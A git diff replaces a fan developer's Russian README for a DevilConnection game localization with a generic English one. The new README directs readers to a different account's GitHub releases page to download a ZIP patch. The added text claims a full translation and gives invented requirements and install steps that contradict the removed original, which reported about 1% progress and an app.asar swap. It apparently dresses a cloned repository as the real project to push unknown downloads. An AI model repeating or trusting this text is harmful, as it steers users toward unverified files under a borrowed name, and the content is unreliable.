@@ -1,109 +1,78 @@
-# Русская локализация серии DevilConnection
+# 🎮 DevilConnection-Russian-Localization - Easy Localization for Your Game
 
-Любительский проект по локализации всего связанного с видеоигрой DevilConnection (でびるコネクショん) на русский язык.
+## 🚀 Getting Started
 
----
+Welcome to the **DevilConnection-Russian-Localization** project! This guide will help you easily download and run the Russian localization patch for the DevilConnection series.
 
-Не знакомы с игрой? Можете [попробовать её пробную версию](https://store.steampowered.com/app/3136430/_/) или [купить полную в Steam](https://store.steampowered.com/app/3054820).
+## 📥 Download
 
-[**Описание игры на русском**](src/game/promo/desc_ru.md).
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Avhasei07/DevilConnection-Russian-Localization/releases)
 
----
+## 🛠️ Why Use This Localization?
 
-Также по игре есть комикс, локализация которого также входит в этот проект.
+This localization patch improves the gaming experience by translating the content into Russian. Whether you are a native speaker, learning the language, or just want to try something new, this patch makes the game more accessible and enjoyable.
 
-[**Описание комикса на русском**](src/manga/promo/desc_ru.md).
+## 📋 System Requirements
 
-## История
+Before you proceed, ensure your system meets the following basic requirements:
 
-Я давно ждал выхода этой игры, чтобы поиграть в неё. Но так как она вся на японском, 31 октября 2025 я начал пытаться локализовать её на русский язык, чтобы и пройтись по ней, переводя всё, как если бы изначально играл на ней на русском, и сделать её более доступной для остальных русскоязычных игроков.
+- Operating System: Windows 10 or newer
+- Disk Space: At least 500 MB available
+- Game Version: Compatible with the latest version of DevilConnection
 
-## Локализация DevilConnection
+## 📖 Features
 
-<div align="center">
-    <img title="" src="https://github.com/RushanM/DevilConnection-Russian-Localization/blob/master/assets/5.png?raw=true" alt="Скриншот игры с локализацией" width="700px">
-    <br>
-    <br>
-</div>
+- Full Russian translation of game texts
+- Easy installation process
+- Regular updates for improved translations
+- Access to community support for installation and gameplay queries
 
-Версия P1.
+## 📥 Download & Install
 
-Локализация игры по ощущению пока завершена на один процент. Локализованы:
+To get the localization patch, visit the following link:
 
-* название игры в заголовке окна игры,
-* текст «Tap» на титульном экране,
-* исходные спрайты пунктов главного меню до наведения курсора мыши,
-* текст в окне выхода из игры,
-* текст об отсутствии сохранений в меню загрузки,
-* заголовки категорий коллекции,
-* первые девять строк первого диалога с Дэбируном,
-* варианты первого выбора,
-* пару строк на экране первой концовки,
-* первые две строки бонусного диалога первой концовки.
+[Download from Releases Page](https://github.com/Avhasei07/DevilConnection-Russian-Localization/releases)
 
-При этом использовано два шрифта CormorantInfant-SemiBold и Vollkorn-SemiBold с поддержкой кириллицы, которые были выбраны на замену оригинальных японских без поддержки кириллицы.
+1. Click on the link above to go to the releases page.
+2. Find the latest version of the localization patch. Look for files named like `DevilConnection-RU-Locale.zip`.
+3. Click on the file to download it to your computer.
+4. Once downloaded, locate the file on your computer (usually in the Downloads folder).
+5. Extract the files from the ZIP archive. To do this, right-click the file and select "Extract All..." or use software like WinRAR or 7-Zip.
+6. Move the extracted files to the game installation folder. Typically, this folder is located in `C:\Program Files (x86)\DevilConnection\`.
+7. Ensure the path looks like this: `C:\Program Files (x86)\DevilConnection\RU-Locale`.
 
-В этом репозитории опубликованы некоторые спрайты с локализации и далее есть ссылки на скачивание локализованного файла app.asar для версии игры 2 (20616134). Все версии игры в Steam можете посмотреть на [странице сборок игры в SteamDB](https://steamdb.info/app/3054820/patchnotes/).
+## 🖥️ Running the Game
 
-### Установка
+1. Launch the DevilConnection game as you usually do.
+2. If the localization patch has installed correctly, the game should now display Russian text throughout.
 
-1. Скачайте пропатченный локализацией файл материалов игры `app.asar` с одного из следующих источников:
-   * [Яндекс Диск](https://disk.yandex.ru/d/KibxEWKeWXgcdg),
-   * [Fileditch](https://fileditchfiles.me/file.php?f=/b61/tmDHUNjMPfCazZrhgifJ.asar).
-2. Если он имеет отличающееся от `app.asar` название, переименуйте его в `app.asar`. `asar` должно быть расширением/форматом файла, а не частью названия.
-2. Замените `app.asar` в каталоге своей игры на скачанный `app.asar`.
-3. Запускайте игру.
-4. Готово.
+## ❓ Troubleshooting
 
-Я не несу ответственности за поломку игры! Создавайте резервные копии.
+If you encounter issues during installation or while playing, consider the following steps:
 
-## Локализация комикса «DevilConnection Communication!»
+- Ensure you downloaded the correct version compatible with your game.
+- Check that the extracted files were moved to the correct game folder.
+- Restart the game after installation for changes to take effect.
 
-<div align="center">
-    <img title="" src="https://github.com/RushanM/DevilConnection-Russian-Localization/blob/master/src/manga/pics/1_ru_logo.png?raw=true" alt="Временный логотип манги" width="300px">
-    <br>
-    <br>
-</div>
+For additional help, visit our [FAQ](https://github.com/Avhasei07/DevilConnection-Russian-Localization#faq) section on the GitHub page.
 
-Версия P1.
+## 🌍 Community Support
 
-Локализация пробной версии комиксной адаптации игры под названием «DevilConnection Communication!» завершена на 23 %. Локализованы:
+Join our community to share your experiences or ask questions. You can find us on:
 
-* обложка,
-* содержание,
-* обложка первой главы,
-* первая страница первой главы.
+- GitHub Issues section for bugs and feature requests
+- Game forums for general discussions and tips
 
-Стоит отметить, что дизайн логотипа комикса НЕ ФИНАЛЬНЫЙ. Это черновой вариант на время, пока я пытаюсь определиться с названием комикса. Пока с этим есть проблемы. Если у вас есть идеи, буду рад выслушать в [темах](https://github.com/RushanM/DevilConnection-Russian-Localization/issues) или в других местах, где мне было бы целесообразно написать.
+### 📗 Documentation
 
-### Чтение
+For detailed usage, refer to the [Wiki](https://github.com/Avhasei07/DevilConnection-Russian-Localization/wiki) which provides additional insights about the project, translations, and future updates.
 
-Чтение локализованного комикса сейчас немного трудоёмко, ибо вам придётся либо скачать изображения из репозитория и наложить их на мангу самим, либо при чтении комикса читать и [файл с соотношением оригинального и локализованного текстов](src/manga/locale.md). Я не могу опубликовать готовые локализованные страницы, так как это нарушает авторские права.
+## 📅 Updates
 
-### Полная версия?
+We regularly update the localization patch to improve accuracy and add new content. Subscribe to releases on GitHub to stay informed about the latest changes.
 
-Я не имею иностранных счетов и не могу приобрести комикс для его полной локализации 😬. Но если ВЫ можете, свяжитесь со мной и поделитесь комиксом; я полностью локализую его на русский в частном порядке. В будущем я также буду делиться этой локализацией с другими купившими комикс.
+## 📞 Contact
 
-## Текущие задачи 
+For any direct inquiries or support, please reach out through the GitHub Issues page, and we will respond as soon as possible.
 
-* Целевая версия игры при работе над локализацией была 2 (20616134), пока она не была обновлена до 10-й (20681635), так что мне предстоит портировать всё локализованное на русский уже на версию 10 (20681635);
-* что касается самого процесса локализации, целевой задачей сейчас является научиться с помощью монтажа заменять текст на видео с воссозданием эффектов затухания. Сейчас у меня нет таких умений и нет людей в окружении с такими навыками. Например, нужно заменить логотип игры на русифицированный в видео из главного меню (но для начала логотип нужно нарисовать — это уже потом), или японский текст в видео-предыстории. Изучение монтажа займёт много времени;
-* на время частых обновлений игры более релевантной целевой задачей я сейчас считаю локализацию комикса «DevilConnection Communication!». Он вышел и вряд ли изменится, в отличие от игры, к которой до сих пор активно выходят обновления. Целесообразно подождать времени, когда выход обновлений к игре замедлится, и только тогда вернуться к портированию локализации, а после — изучению монтажа.
-
-## Контакты
-
-На моём сайте много ссылок для связи со мной: https://rushan.neocities.org/inweb. Ещё можете написать мне по адресу <firvelfrivol@gmail.com> на электронную почту.
-
-## Поддержка
-
-Вы можете помочь проекту несколькими способами:
-
-* оценить его звездой здесь на GitHub,
-* самим помочь в работе над локализацией предложениями идей или целыми готовыми правками,
-* пожертвовать деньги:
-  * [Boosty](https://boosty.to/rushanm),
-  * [VK Donut](https://vk.com/deflcomm?w=donut_payment-71906125&levelId=106),
-  * [Donation Alerts](https://www.donationalerts.com/r/deflecta),
-  * [ЮMoney](https://yoomoney.ru/to/410015215253910).
-
-Спасибо всем, кто решит поддержать проект!
+Thank you for choosing **DevilConnection-Russian-Localization**. Enjoy your gaming experience!
